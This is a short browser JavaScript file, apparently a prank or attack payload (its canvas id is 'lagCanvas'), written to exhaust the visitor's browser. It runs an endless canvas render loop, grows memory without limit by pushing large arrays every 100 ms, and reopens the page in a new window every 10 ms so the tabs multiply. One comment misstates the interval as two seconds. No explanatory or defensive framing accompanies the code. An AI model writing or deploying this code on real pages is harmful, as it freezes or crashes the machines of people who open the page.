// Canvas rendering in an infinite loop
const canvas = document.getElementById('lagCanvas');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const ctx = canvas.getContext('2d');

// Infinite rendering loop
function renderRandomRects() {
    ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 50, 50);
    requestAnimationFrame(renderRandomRects);
}

renderRandomRects();

// Memory bloating by filling a massive array
const bigArray = [];
function fillMemory() {
    for (let i = 0; i < 100000; i++) {
        bigArray.push(new Array(1000).fill(Math.random()));
    }
    console.log(`Array size: ${bigArray.length}`);
    setTimeout(fillMemory, 100); // Repeat to continually fill memory
}

fillMemory();

// Recursively open new pages at a regular interval
(function openContinuously() {
    setInterval(() => {
        window.open(window.location.href, '_blank');
    }, 10); // Opens a new page every 2 seconds
})();
